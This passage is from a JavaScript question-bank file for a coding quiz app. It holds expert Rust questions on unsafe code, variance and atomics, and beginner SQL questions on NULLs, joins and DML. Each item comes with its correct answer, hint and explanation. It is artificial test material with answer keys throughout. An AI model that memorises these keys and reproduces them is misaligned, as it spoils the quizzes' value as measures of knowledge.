      "By shadowing variables declared with `const`",
      "By calling String::from inside a thread"
    ],
    correctAnswer: "By creating reference cycles using `Rc` and `RefCell`, preventing strong reference counts from ever reaching zero",
    acceptedAnswers: ["By creating reference cycles using `Rc` and `RefCell`, preventing strong reference counts from ever reaching zero"],
    hint: "Memory leaks in Rust are memory-safe (they do not cause undefined behavior). Cyclic `Rc` graphs prevent `drop` from executing.",
    explanation: "Rust guarantees memory safety (preventing data races, use-after-free, double-free), but memory leaks are explicitly not considered unsafe. Creating cycles of `Rc<RefCell<T>>` pointers causes strong counts to stay >= 1, preventing cleanup. `Weak<T>` is used to break cycles.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["memory_leak", "rc", "refcell"]
  },
  {
    id: "rust-exp-009",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "transmute",
    subtopic: "mem_transmute",
    standardVersion: "Rust 2021",
    prompt: "What strict requirement does `std::mem::transmute` enforce at compile time when reinterpreting bits between types?",
    code: "unsafe {\n    let val: u32 = std::mem::transmute(float_val); // f32 -> u32\n}",
    options: [
      "The source and destination types must have the exact same size in bytes",
      "Both types must implement the Display trait",
      "The source type must be smaller than 8 bytes",
      "Transmute only works with signed integers"
    ],
    correctAnswer: "The source and destination types must have the exact same size in bytes",
    acceptedAnswers: ["The source and destination types must have the exact same size in bytes"],
    hint: "`std::mem::transmute` reinterprets bits directly. Size differences cause compile errors.",
    explanation: "`std::mem::transmute` reinterprets the bits of one type as another. It is one of the most dangerous unsafe functions in Rust. The compiler enforces that `size_of::<Src>() == size_of::<Dst>()`; failing this check produces a compile-time error.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["transmute", "unsafe", "memory"]
  },
  {
    id: "rust-exp-010",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "memory_management",
    subtopic: "manually_drop",
    standardVersion: "Rust 2021",
    prompt: "What is the primary role of `std::mem::ManuallyDrop<T>`?",
    code: "use std::mem::ManuallyDrop;\nlet mut x = ManuallyDrop::new(Box::new(42));",
    options: [
      "A wrapper that prevents the compiler from automatically calling the destructor on `T` when it exits scope",
      "Forces an object to be dropped on a background thread",
      "Converts heap allocations into stack allocations",
      "Deletes an object from memory immediately"
    ],
    correctAnswer: "A wrapper that prevents the compiler from automatically calling the destructor on `T` when it exits scope",
    acceptedAnswers: ["A wrapper that prevents the compiler from automatically calling the destructor on `T` when it exits scope"],
    hint: "`ManuallyDrop` disables automatic drop handling, useful for custom memory allocators and union handling.",
    explanation: "`ManuallyDrop<T>` tells the Rust compiler not to run the destructor for `T` when the variable goes out of scope. This is essential when implementing custom allocators, FFI handoffs, or managing memory buffers manually via `unsafe`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["manually_drop", "memory", "raii"]
  },
  {
    id: "rust-exp-011",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "types",
    subtopic: "dynamically_sized_types",
    standardVersion: "Rust 2021",
    prompt: "Why do generic type parameters in Rust have an implicit `T: Sized` bound unless explicitly written as `T: ?Sized`?",
    code: "// Implicit Sized\nfn func<T>(x: T) {} // actually fn func<T: Sized>(x: T)\nfn slice_func<T: ?Sized>(x: &T) {} // Relaxes bound",
    options: [
      "Most code requires types to have a known size at compile time to store them on the stack or calculate struct offsets",
      "Because dynamically sized types are slower to parse",
      "Because Sized types cannot implement traits",
      "To prevent generics from being monomorphized"
    ],
    correctAnswer: "Most code requires types to have a known size at compile time to store them on the stack or calculate struct offsets",
    acceptedAnswers: ["Most code requires types to have a known size at compile time to store them on the stack or calculate struct offsets"],
    hint: "`?Sized` opts out of the default requirement that `T` has a known size at compile time (permitting `str` and `[T]`).",
    explanation: "Rust functions and structs need to know the byte size of variables at compile time to allocate stack space. Thus, all generics implicitly have `T: Sized`. Writing `<T: ?Sized>` opts out of this restriction, allowing dynamically sized types like `[T]` or `str` behind references `&T`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["sized", "dst", "generics"]
  },
  {
    id: "rust-exp-012",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "macros",
    subtopic: "procedural_macros",
    standardVersion: "Rust 2021",
    prompt: "In what compiler phase do Rust Procedural Macros (`proc_macro`) execute?",
    code: "#[proc_macro_derive(MyTrait)]\npub fn my_derive(input: TokenStream) -> TokenStream { ... }",
    options: [
      "They run at compile time as separate compiler plugins, consuming an abstract syntax TokenStream and emitting a modified TokenStream",
      "They run at runtime when the application initializes main()",
      "They execute during LLVM code emission to optimize assembly",
      "They are executed inside the terminal shell before rustc is invoked"
    ],
    correctAnswer: "They run at compile time as separate compiler plugins, consuming an abstract syntax TokenStream and emitting a modified TokenStream",
    acceptedAnswers: ["They run at compile time as separate compiler plugins, consuming an abstract syntax TokenStream and emitting a modified TokenStream"],
    hint: "Procedural macros are compiled into separate dynamic libraries and run inside the compiler at compile time.",
    explanation: "Procedural macros are functions executed by the Rust compiler during compilation. They accept a stream of tokens (`TokenStream`), operate on the syntax tree, and return new Rust code (`TokenStream`) to be compiled.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["macros", "proc_macro", "compiler"]
  },
  {
    id: "rust-exp-013",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "variance",
    subtopic: "subtyping_lifetimes",
    standardVersion: "Rust 2021",
    prompt: "What is the variance of a mutable reference `&mut T` over its type parameter `T`?",
    code: "// Variance in Rust\n&'a T       is covariant over 'a and covariant over T\n&'a mut T   is covariant over 'a and ??? over T",
    options: [
      "Invariant over `T` (subtyping cannot substitute a longer or shorter lifetime for T)",
      "Covariant over `T`",
      "Contravariant over `T`",
      "Bivariant over `T`"
    ],
    correctAnswer: "Invariant over `T` (subtyping cannot substitute a longer or shorter lifetime for T)",
    acceptedAnswers: ["Invariant over `T` (subtyping cannot substitute a longer or shorter lifetime for T)"],
    hint: "If `&mut T` were covariant, you could write a reference with a shorter lifetime into a variable expecting a longer lifetime, causing a use-after-free.",
    explanation: "`&mut T` must be invariant over `T`. Because a mutable reference allows both reading from and writing to `T`, permitting covariance would allow writing a short-lived reference into a storage expecting a long-lived reference, leading to dangling pointers.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["variance", "subtyping", "lifetimes"]
  },
  {
    id: "rust-exp-014",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "ffi",
    subtopic: "no_mangle_extern",
    standardVersion: "Rust 2021",
    prompt: "Why is `#[no_mangle]` required when exporting a Rust function for foreign C code to link against?",
    code: "#[no_mangle]\npub extern \"C\" fn add(a: i32, b: i32) -> i32 {\n    a + b\n}",
    options: [
      "It instructs the Rust compiler not to obfuscate the symbol name with hash suffixes, preserving the exact function name in the symbol table",
      "It prevents the function from being inlined by LLVM",
      "It compiles the function using 32-bit registers",
      "It marks the function as safe from buffer overflows"
    ],
    correctAnswer: "It instructs the Rust compiler not to obfuscate the symbol name with hash suffixes, preserving the exact function name in the symbol table",
    acceptedAnswers: ["It instructs the Rust compiler not to obfuscate the symbol name with hash suffixes, preserving the exact function name in the symbol table"],
    hint: "Rust mangles function names with crate and version hashes for uniqueness. `#[no_mangle]` forces the symbol name to remain `add`.",
    explanation: "By default, Rust mangles symbol names (e.g. `_ZN3add17h12345678...`) to support generics and modules. `#[no_mangle]` tells the compiler to emit the exact symbol name (`add`), and `extern \"C\"` uses the C calling convention.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["ffi", "no_mangle", "c_abi"]
  },
  {
    id: "rust-exp-015",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "optimization",
    subtopic: "zero_cost_iterators",
    standardVersion: "Rust 2021",
    prompt: "Why can chained functional iterator pipelines (`iter().map().filter().sum()`) run as fast or faster than manual `for` loops in Rust?",
    code: "let sum: i32 = v.iter().filter(|&&x| x > 0).map(|&x| x * 2).sum();",
    options: [
      "The compiler monomorphizes and inlines the iterators, eliminating bounds checks and loop overhead to generate SIMD vector instructions",
      "Iterators automatically spawn thread pools for each element",
      "Iterators bypass memory safety checks",
      "Iterators are converted to JIT machine code at runtime"
    ],
    correctAnswer: "The compiler monomorphizes and inlines the iterators, eliminating bounds checks and loop overhead to generate SIMD vector instructions",
    acceptedAnswers: ["The compiler monomorphizes and inlines the iterators, eliminating bounds checks and loop overhead to generate SIMD vector instructions"],
    hint: "Zero-cost abstractions: what you don't use, you don't pay for. And what you do use, you couldn't hand code any better.",
    explanation: "Rust iterators are zero-cost abstractions. Through monomorphization and aggressive compiler inlining, LLVM flattens the chained closures and adapters into tight assembly loops, often vectorizing them with SIMD instructions and avoiding redundant bounds checks.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["zero_cost", "optimization", "iterators"]
  },
  {
    id: "rust-exp-016",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "async_internals",
    subtopic: "waker_context",
    standardVersion: "Rust 2021",
    prompt: "In the Rust async/await executor model, what is the role of the `Waker` passed in `Context`?",
    code: "fn poll(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Self::Output> {\n    // cx.waker().wake_by_ref();\n}",
    options: [
      "A handle that an asynchronous event source calls to notify the executor that the task is ready to be polled again",
      "A timer that sleeps the operating system thread",
      "A memory allocator for async stack frames",
      "A cryptographic token validating task authenticity"
    ],
    correctAnswer: "A handle that an asynchronous event source calls to notify the executor that the task is ready to be polled again",
    acceptedAnswers: ["A handle that an asynchronous event source calls to notify the executor that the task is ready to be polled again"],
    hint: "Instead of busy-waiting, a future returns `Poll::Pending` and saves the `Waker`. When an I/O event arrives, `wake()` schedules the future.",
    explanation: "Rust uses a poll-based async model. When a future returns `Poll::Pending`, it arranges for `cx.waker().wake()` to be called when the event (e.g. socket read ready) completes. The waker places the task back onto the executor's run queue.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["async", "waker", "executor"]
  },
  {
    id: "rust-exp-017",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "type_system",
    subtopic: "typestate_pattern",
    standardVersion: "Rust 2021",
    prompt: "What is the primary advantage of the Typestate Pattern implemented with zero-sized phantom types?",
    code: "struct Order<State> { state: PhantomData<State> }\nstruct Placed;\nstruct Shipped;\nimpl Order<Placed> {\n    fn ship(self) -> Order<Shipped> { ... }\n}",
    options: [
      "Invalid state transitions (e.g. shipping an order that was not placed) are rejected at compile time rather than checked at runtime",
      "It allows orders to be stored without database transactions",
      "It compresses the struct size to 0 bytes in memory",
      "It speeds up network serialization by 50%"
    ],
    correctAnswer: "Invalid state transitions (e.g. shipping an order that was not placed) are rejected at compile time rather than checked at runtime",
    acceptedAnswers: ["Invalid state transitions (e.g. shipping an order that was not placed) are rejected at compile time rather than checked at runtime"],
    hint: "Methods are only implemented on specific generic state parameters (`impl Order<Placed>`), making illegal state calls compile errors.",
    explanation: "The Typestate pattern encodes protocol/state-machine states into the type system using zero-sized marker types. Transition methods consume `self` and return a new state. Calling invalid methods fails compilation, eliminating runtime state validation bugs.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["typestate", "type_system", "phantom_data"]
  },
  {
    id: "rust-exp-018",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "undefined_behavior",
    subtopic: "invalid_references",
    standardVersion: "Rust 2021",
    prompt: "Which of the following creates Undefined Behavior (UB) even inside an `unsafe` block in Rust?",
    code: "unsafe {\n    // Which of these invokes instantaneous UB?\n}",
    options: [
      "Creating an invalid reference (such as a null reference `&*std::ptr::null()` or dangling reference)",
      "Leaking memory using Box::leak",
      "Performing an integer overflow in release mode with wrapping arithmetic",
      "Creating a deadlock between two Mutex locks"
    ],
    correctAnswer: "Creating an invalid reference (such as a null reference `&*std::ptr::null()` or dangling reference)",
    acceptedAnswers: ["Creating an invalid reference (such as a null reference `&*std::ptr::null()` or dangling reference)"],
    hint: "References (`&T` and `&mut T`) must ALWAYS be non-null and point to valid, properly aligned memory. Creating a null reference is instant UB.",
    explanation: "In Rust, references MUST always be valid and non-null. Dereferencing a null pointer to produce a reference `&*ptr` is instantaneous Undefined Behavior, even if never read. Memory leaks and deadlocks are undesirable, but explicitly NOT undefined behavior.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["undefined_behavior", "unsafe", "references"]
  },
  {
    id: "rust-exp-019",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "macros",
    subtopic: "macro_rules_hygiene",
    standardVersion: "Rust 2021",
    prompt: "What does macro hygiene in declarative macros (`macro_rules!`) guarantee?",
    code: "macro_rules! test {\n    () => { let x = 5; };\n}",
    options: [
      "Variables declared inside the macro cannot accidentally clash with or shadow variables in the calling code",
      "The macro code is scanned for memory leaks before compilation",
      "Macros can only be invoked once per module",
      "Variables inside the macro are automatically encrypted"
    ],
    correctAnswer: "Variables declared inside the macro cannot accidentally clash with or shadow variables in the calling code",
    acceptedAnswers: ["Variables declared inside the macro cannot accidentally clash with or shadow variables in the calling code"],
    hint: "Unlike C preprocessor `#define`, Rust declarative macros have syntax hygiene: variables declared inside don't leak out.",
    explanation: "Rust declarative macros are partially hygienic: local variables declared inside a macro have a distinct syntax context and cannot accidentally refer to or collide with identifiers in the surrounding scope where the macro was expanded.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["macros", "macro_rules", "hygiene"]
  },
  {
    id: "rust-exp-020",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "atomics",
    subtopic: "memory_ordering",
    standardVersion: "Rust 2021",
    prompt: "In atomic operations, how does `Ordering::Acquire` and `Ordering::Release` pair to synchronize memory across threads?",
    code: "use std::sync::atomic::{AtomicBool, Ordering};\nlock.store(true, Ordering::Release);\nwhile !lock.load(Ordering::Acquire) {}",
    options: [
      "All memory writes prior to the Release store become visible to another thread once it executes the Acquire load that observes that store",
      "Acquire and Release force sequential consistency across all CPU cores globally with full pipeline flushes",
      "Release causes the thread to sleep until Acquire is executed",
      "Acquire encrypts memory while Release decrypts it"
    ],
    correctAnswer: "All memory writes prior to the Release store become visible to another thread once it executes the Acquire load that observes that store",
    acceptedAnswers: ["All memory writes prior to the Release store become visible to another thread once it executes the Acquire load that observes that store"],
    hint: "Acquire-Release semantics establish a 'happens-before' relationship without the full performance overhead of `SeqCst`.",
    explanation: "`Acquire-Release` forms a synchronizes-with relationship. A `Release` store ensures all previous memory writes in that thread are completed before the store. An `Acquire` load ensures all subsequent reads in the observing thread see the synchronized writes.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["atomics", "memory_ordering", "concurrency"]
  }
];

/* --- End of data/rust-questions.js --- */

/* --- Start of data/sql-questions.js --- */
/**
 * SyntaxArena Question Bank — SQL (ANSI / PostgreSQL / Relational DBs)
 * Exactly 60 curated challenges: 20 Beginner, 20 Intermediate, 20 Expert.
 * Standard: ANSI SQL / PostgreSQL 15+
 * Source of truth: docs/QUESTION_SCHEMA.md
 */

var sqlQuestions = window.sqlQuestions = [
  // =========================================================================
  // SQL BEGINNER (20 QUESTIONS: sql-beg-001 to sql-beg-020)
  // =========================================================================
  {
    id: "sql-beg-001",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "null_handling",
    subtopic: "is_null_predicate",
    standardVersion: "ANSI SQL",
    prompt: "Why does the query `SELECT * FROM users WHERE score = NULL;` return 0 rows even when records with NULL score exist?",
    code: "-- Table users has 3 rows where score is NULL\nSELECT COUNT(*) FROM users WHERE score = NULL;",
    options: [
      "In three-valued logic, comparison with NULL using `=` evaluates to UNKNOWN (falsy in WHERE); `IS NULL` must be used",
      "Because NULL values are automatically converted to 0 in SQL",
      "Syntax error: NULL must be wrapped in single quotes",
      "The query returns all rows in the table"
    ],
    correctAnswer: "In three-valued logic, comparison with NULL using `=` evaluates to UNKNOWN (falsy in WHERE); `IS NULL` must be used",
    acceptedAnswers: ["In three-valued logic, comparison with NULL using `=` evaluates to UNKNOWN (falsy in WHERE); `IS NULL` must be used"],
    hint: "In SQL three-valued logic, `anything = NULL` yields `UNKNOWN`. Only the `IS NULL` predicate tests for nulls.",
    explanation: "SQL uses three-valued logic (TRUE, FALSE, UNKNOWN). Comparing any value to NULL using standard equality (`= NULL`) evaluates to UNKNOWN, which the WHERE clause filters out. Testing for missing data requires the `IS NULL` operator.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "null", "predicates"]
  },
  {
    id: "sql-beg-002",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "aggregates",
    subtopic: "count_star_vs_column",
    standardVersion: "ANSI SQL",
    prompt: "What is printed by COUNT(*) compared to COUNT(email) when a table has 5 rows and 2 rows have NULL email?",
    code: "-- 5 total rows, 2 have NULL email\nSELECT COUNT(*), COUNT(email) FROM users;",
    options: ["5 3", "5 5", "3 3", "5 2"],
    correctAnswer: "5 3",
    acceptedAnswers: ["5 3"],
    hint: "`COUNT(*)` counts all rows regardless of content. `COUNT(column)` counts only rows where the column is NOT NULL.",
    explanation: "`COUNT(*)` returns the total count of rows in the table (5). In contrast, `COUNT(column_name)` ignores rows where the specified column contains a NULL value. With 2 NULLs out of 5 rows, `COUNT(email)` evaluates to 3.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "aggregates", "count"]
  },
  {
    id: "sql-beg-003",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "filtering",
    subtopic: "having_vs_where",
    standardVersion: "ANSI SQL",
    prompt: "What is the primary difference in execution timing between the `WHERE` and `HAVING` clauses?",
    code: "SELECT dept, COUNT(*) \nFROM employees \nWHERE salary > 50000 \nGROUP BY dept \nHAVING COUNT(*) > 2;",
    options: [
      "`WHERE` filters individual rows before grouping; `HAVING` filters aggregated group results after grouping",
      "`WHERE` filters aggregated groups; `HAVING` filters individual table rows",
      "`WHERE` can only be used with numbers; `HAVING` only with strings",
      "`WHERE` and `HAVING` are completely interchangeable in ANSI SQL"
    ],
    correctAnswer: "`WHERE` filters individual rows before grouping; `HAVING` filters aggregated group results after grouping",
    acceptedAnswers: ["`WHERE` filters individual rows before grouping; `HAVING` filters aggregated group results after grouping"],
    hint: "`WHERE` cannot filter on aggregate functions like `COUNT(*)` or `AVG()` because grouping has not occurred yet.",
    explanation: "In SQL query execution order, `WHERE` evaluates first to filter individual table rows prior to grouping. `GROUP BY` aggregates the remaining rows into buckets. Finally, `HAVING` evaluates filter predicates on the resulting aggregated groups.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "having", "where", "group_by"]
  },
  {
    id: "sql-beg-004",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "joins",
    subtopic: "inner_vs_left_join",
    standardVersion: "ANSI SQL",
    prompt: "What happens to rows in Table A that have no matching foreign key in Table B during a `LEFT JOIN`?",
    code: "SELECT a.name, b.order_num \nFROM customers a \nLEFT JOIN orders b ON a.id = b.customer_id;",
    options: [
      "All rows from Table A are preserved; columns from Table B are populated with NULL values",
      "Rows without matches in Table B are dropped from the result set",
      "The query fails with a Foreign Key Violation error",
      "Table B columns are filled with default string 'EMPTY'"
    ],
    correctAnswer: "All rows from Table A are preserved; columns from Table B are populated with NULL values",
    acceptedAnswers: ["All rows from Table A are preserved; columns from Table B are populated with NULL values"],
    hint: "A `LEFT (OUTER) JOIN` guarantees that every record from the left table appears in the output.",
    explanation: "A `LEFT JOIN` returns all records from the left table (customers) regardless of whether a match exists in the right table (orders). When there is no match on the join predicate, columns from the right table are filled with `NULL`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "joins", "left_join"]
  },
  {
    id: "sql-beg-005",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "query_basics",
    subtopic: "distinct_rows",
    standardVersion: "ANSI SQL",
    prompt: "What does `SELECT DISTINCT role, team FROM players;` output when multiple players have the same role and team?",
    code: "// Players table contains:\n('Striker', 'Red'), ('Striker', 'Red'), ('Defender', 'Blue')\nSELECT DISTINCT role, team FROM players;",
    options: [
      "Two rows: ('Striker', 'Red') and ('Defender', 'Blue')",
      "Three rows (DISTINCT only applies to the first column)",
      "One row",
      "Error: DISTINCT can only take one column"
    ],
    correctAnswer: "Two rows: ('Striker', 'Red') and ('Defender', 'Blue')",
    acceptedAnswers: ["Two rows: ('Striker', 'Red') and ('Defender', 'Blue')"],
    hint: "`DISTINCT` applies to the entire combination of selected columns in the projection list.",
    explanation: "`SELECT DISTINCT` evaluates uniqueness across the combination of all selected columns in the row. The duplicate `('Striker', 'Red')` row is collapsed into one, returning exactly two unique rows.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "distinct", "projection"]
  },
  {
    id: "sql-beg-006",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "filtering",
    subtopic: "between_boundaries",
    standardVersion: "ANSI SQL",
    prompt: "Is the SQL `BETWEEN` operator inclusive or exclusive of its boundary values?",
    code: "SELECT val FROM numbers WHERE val BETWEEN 5 AND 10;",
    options: [
      "Inclusive of both boundaries (equivalent to `val >= 5 AND val <= 10`)",
      "Exclusive of both boundaries (equivalent to `val > 5 AND val < 10`)",
      "Inclusive of the lower bound, exclusive of the upper bound",
      "Depends on database configuration"
    ],
    correctAnswer: "Inclusive of both boundaries (equivalent to `val >= 5 AND val <= 10`)",
    acceptedAnswers: ["Inclusive of both boundaries (equivalent to `val >= 5 AND val <= 10`)"],
    hint: "`BETWEEN low AND high` matches both `low` and `high` values.",
    explanation: "According to the ANSI SQL standard, `BETWEEN a AND b` is defined as inclusive of both endpoints: `x >= a AND x <= b`. Rows with values 5 and 10 will both be included.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "between", "predicates"]
  },
  {
    id: "sql-beg-007",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "string_matching",
    subtopic: "like_wildcards",
    standardVersion: "ANSI SQL",
    prompt: "In the SQL `LIKE` clause, what is the difference between `%` and `_` wildcards?",
    code: "SELECT code FROM items WHERE code LIKE 'A_B%';",
    options: [
      "`_` matches exactly one character; `%` matches zero or more characters",
      "`%` matches exactly one character; `_` matches zero or more characters",
      "`_` matches numbers only; `%` matches letters only",
      "`_` matches spaces; `%` matches punctuation"
    ],
    correctAnswer: "`_` matches exactly one character; `%` matches zero or more characters",
    acceptedAnswers: ["`_` matches exactly one character; `%` matches zero or more characters"],
    hint: "Underscore `_` is single-character placeholder. Percent `%` is arbitrary length placeholder.",
    explanation: "In standard SQL `LIKE` pattern matching, the underscore `_` represents exactly one single character, while the percent sign `%` represents any sequence of zero or more characters. 'A1Bxyz' matches 'A_B%'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "like", "wildcards"]
  },
  {
    id: "sql-beg-008",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "ordering",
    subtopic: "order_by_nulls",
    standardVersion: "ANSI SQL",
    prompt: "What does `ORDER BY score DESC NULLS LAST` guarantee across SQL engines?",
    code: "SELECT player, score \nFROM leaderboard \nORDER BY score DESC NULLS LAST;",
    options: [
      "Rows with NULL scores appear at the very bottom of the results regardless of ascending or descending order",
      "Rows with NULL scores are excluded from the output",
      "NULL scores are converted to -1 before sorting",
      "NULL scores appear first in descending order"
    ],
    correctAnswer: "Rows with NULL scores appear at the very bottom of the results regardless of ascending or descending order",
    acceptedAnswers: ["Rows with NULL scores appear at the very bottom of the results regardless of ascending or descending order"],
    hint: "`NULLS LAST` explicitly positions null values at the end of the sorted output.",
    explanation: "Standard SQL default sorting of NULL values varies across database engines (e.g. Postgres sorts nulls first in DESC, while MySQL sorts them last). Explicitly declaring `NULLS LAST` guarantees that NULL entries appear at the very end of the result set.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "order_by", "nulls"]
  },
  {
    id: "sql-beg-009",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "pagination",
    subtopic: "limit_offset",
    standardVersion: "ANSI / PostgreSQL",
    prompt: "What rows are returned by `LIMIT 5 OFFSET 10` on an ordered result set?",
    code: "SELECT id FROM items ORDER BY id LIMIT 5 OFFSET 10;",
    options: [
      "5 rows: skipping the first 10 rows (returning rows 11 through 15)",
      "10 rows starting from row 5",
      "Rows with IDs between 5 and 10",
      "5 rows starting from row 10 (rows 10 through 14)"
    ],
    correctAnswer: "5 rows: skipping the first 10 rows (returning rows 11 through 15)",
    acceptedAnswers: ["5 rows: skipping the first 10 rows (returning rows 11 through 15)"],
    hint: "`OFFSET N` skips the first N rows before returning up to `LIMIT M` rows.",
    explanation: "`OFFSET 10` skips the initial 10 records produced by the query. `LIMIT 5` then returns up to 5 consecutive records from that starting point, retrieving records 11, 12, 13, 14, and 15.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "pagination", "limit", "offset"]
  },
  {
    id: "sql-beg-010",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "constraints",
    subtopic: "primary_key",
    standardVersion: "ANSI SQL",
    prompt: "What dual constraints are implicitly enforced on any column declared as a `PRIMARY KEY`?",
    code: "CREATE TABLE accounts (\n    account_id INT PRIMARY KEY,\n    email VARCHAR(255)\n);",
    options: [
      "`UNIQUE` and `NOT NULL`",
      "`UNIQUE` and `CHECK (account_id > 0)`",
      "`NOT NULL` and `FOREIGN KEY`",
      "`INDEXED` and `IMMUTABLE`"
    ],
    correctAnswer: "`UNIQUE` and `NOT NULL`",
    acceptedAnswers: ["`UNIQUE` and `NOT NULL`"],
    hint: "A primary key must uniquely identify every row and can never contain missing/null values.",
    explanation: "By relational database definition and standard SQL rules, a `PRIMARY KEY` column automatically enforces both `UNIQUE` (every row must have a distinct value) and `NOT NULL` (null values are strictly disallowed).",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "primary_key", "constraints"]
  },
  {
    id: "sql-beg-011",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "dml",
    subtopic: "delete_without_where",
    standardVersion: "ANSI SQL",
    prompt: "What is the consequence of executing `DELETE FROM users;` without a `WHERE` clause?",
    code: "DELETE FROM users;",
    options: [
      "Deletes all rows in the users table while leaving the table structure intact",
      "Throws a syntax error requiring an explicit WHERE clause",
      "Drops the table from the database schema entirely",
      "Deletes only the first row in the table"
    ],
    correctAnswer: "Deletes all rows in the users table while leaving the table structure intact",
    acceptedAnswers: ["Deletes all rows in the users table while leaving the table structure intact"],
    hint: "`DELETE FROM table` applies to all rows matching the predicate; omitting the predicate matches every row.",
    explanation: "A `DELETE` statement without a `WHERE` clause removes every row in the target table one by one. The table definition, constraints, and schema remain intact (unlike `DROP TABLE`, which removes the table entirely).",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "dml", "delete"]
  },
  {
    id: "sql-beg-012",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "aggregates",
    subtopic: "sum_with_nulls",
    standardVersion: "ANSI SQL",
    prompt: "What does `SUM(val)` return when applied to a column containing `[10, NULL, 20]`?",
    code: "-- Table values has rows: 10, NULL, 20\nSELECT SUM(val) FROM values;",
    options: ["30", "NULL", "NaN", "Error: cannot sum NULL values"],
    correctAnswer: "30",
    acceptedAnswers: ["30"],
    hint: "SQL aggregate functions (SUM, AVG, MIN, MAX) automatically ignore NULL values during computation.",
    explanation: "Standard SQL aggregate functions (except `COUNT(*)`) silently disregard NULL entries when aggregating. `SUM(val)` sums 10 + 20 = 30. (If ALL rows are NULL, `SUM` returns NULL).",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "sum", "aggregates", "null"]
  },
  {
    id: "sql-beg-013",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "joins",
    subtopic: "cross_join_rows",
    standardVersion: "ANSI SQL",
    prompt: "How many total rows are produced by a `CROSS JOIN` between Table A with 4 rows and Table B with 5 rows?",
    code: "SELECT * FROM table_a CROSS JOIN table_b;",
    options: ["20", "9", "4", "5"],
    correctAnswer: "20",
    acceptedAnswers: ["20"],
    hint: "A CROSS JOIN computes the Cartesian product: multiplying row counts `N * M`.",
    explanation: "A `CROSS JOIN` pairs every row from the first table with every row from the second table without any join filter. With 4 rows in A and 5 rows in B, the Cartesian product yields `4 * 5 = 20` total rows.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "cross_join", "joins"]
  },
  {
    id: "sql-beg-014",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "filtering",
    subtopic: "in_predicate",
    standardVersion: "ANSI SQL",
    prompt: "Which rows match `WHERE status IN ('active', 'pending')`?",
    code: "SELECT id, status FROM tasks WHERE status IN ('active', 'pending');",
    options: [
      "Rows where status is either 'active' or 'pending'",
      "Rows where status contains both words simultaneously",
      "Rows where status is neither 'active' nor 'pending'",
      "Only rows matching the first entry 'active'"
    ],
    correctAnswer: "Rows where status is either 'active' or 'pending'",
    acceptedAnswers: ["Rows where status is either 'active' or 'pending'"],
    hint: "The `IN (val1, val2)` operator is shorthand for `status = 'active' OR status = 'pending'`.",
    explanation: "The `IN` predicate tests if an expression matches any value in a list of literals or subquery results. It is logically equivalent to chaining `OR` conditions: `status = 'active' OR status = 'pending'`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "in", "predicates"]
  },
  {
    id: "sql-beg-015",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "dml",
    subtopic: "insert_multiple_rows",
    standardVersion: "ANSI SQL",
    prompt: "What is the standard syntax for inserting multiple rows in a single `INSERT` statement?",
    code: "INSERT INTO tags (name) VALUES ('python'), ('rust'), ('sql');",
    options: [
      "Comma-separated parenthesized value lists after the VALUES keyword",
      "Repeating the INSERT INTO keyword for each value",
      "Enclosing all values in square brackets",
      "Using the MULTI_INSERT command"
    ],
    correctAnswer: "Comma-separated parenthesized value lists after the VALUES keyword",
    acceptedAnswers: ["Comma-separated parenthesized value lists after the VALUES keyword"],
